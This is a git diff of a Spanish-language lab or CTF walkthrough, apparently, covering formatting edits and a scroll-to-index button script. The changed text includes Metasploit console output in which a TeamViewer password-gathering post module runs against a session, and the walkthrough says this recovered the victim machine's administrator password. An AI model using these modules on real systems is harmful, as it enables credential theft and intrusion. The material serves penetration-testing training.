 ================
-.
    #  Name                                                  Disclosure Date  Rank    Check  Description
    -  ----                                                  ---------------  ----    -----  -----------
    0  auxiliary/server/teamviewer_uri_smb_redirect                           normal  No     TeamViewer Unquoted URI Handler SMB Redirect
@@ -1327,9 +1318,8 @@ Matching Modules
 ```bash
 msf6 exploit(multi/script/web_delivery) > use post/windows/gather/credentials/teamviewer_passwords
 msf6 post(windows/gather/credentials/teamviewer_passwords) > show options
-.
+*
 Module options (post/windows/gather/credentials/teamviewer_passwords):
-.
    Name          Current Setting  Required  Description
    ----          ---------------  --------  -----------
    SESSION                        yes       The session to run this module on
@@ -1351,17 +1341,15 @@ msf6 post(windows/gather/credentials/teamviewer_passwords) > exploit
 [*] Post module execution completed
 ```
 
-De esta forma, obtuvimos la contraseña que necesitamos para poder conectarnos a la máquina víctima como administrador, que fue lo mismo que hicimos al principio para obtener la contraseña del **TeamViewer**.
+De esta forma, obtuvimos la contraseña que necesitamos para poder conectarnos a la máquina víctima como **administrador**, que fue lo mismo que hicimos al principio para obtener la contraseña del **TeamViewer**.
 
 
 <br>
 <br>
 <div style="position: relative;">
- <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h2 id="Links" style="text-align:center;">Links de Investigación</h2>
 </div>
+
 
 * https://book.hacktricks.xyz/network-services-pentesting/pentesting-rpcbind
 * https://our.umbraco.com/forum/developers/api-questions/8905-Where-does-Umbraco-store-data
@@ -1380,3 +1368,48 @@ De esta forma, obtuvimos la contraseña que necesitamos para poder conectarnos a
 
 <br>
 # FIN
+
+<footer id="myFooter">
+    <!-- Footer para eliminar el botón -->
+</footer>
+
+<style>
+        #backToIndex {
+                display: none;
+                position: fixed;
+                left: 87%;
+                top: 90%;
+                z-index: 2000;
+                background-color: #81fbf9;
+                border-radius: 10px;
+                border: none;
+                padding: 4px 6px;
+                cursor: pointer;
+        }
+</style>
+
+<a id="backToIndex" href="#Indice">
+        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
+</a>
+
+<script>
+    window.onscroll = function() { showButton() };
+
+    function showButton() {
+        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
+        const indicePosition = document.getElementById("Indice").offsetTop;
+        const footerPosition = document.getElementById("myFooter").offsetTop;
+        const windowHeight = window.innerHeight;
+
+        const button = document.getElementById("backToIndex");
+
+        // Mostrar el botón si el usuario ha bajado al índice
+        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
+            button.style.display = "block";
+            button.style.position = "fixed";
+            button.style.top = "90%";
+        } else {
+            button.style.display = "none";
+        }
+    }
+</script>
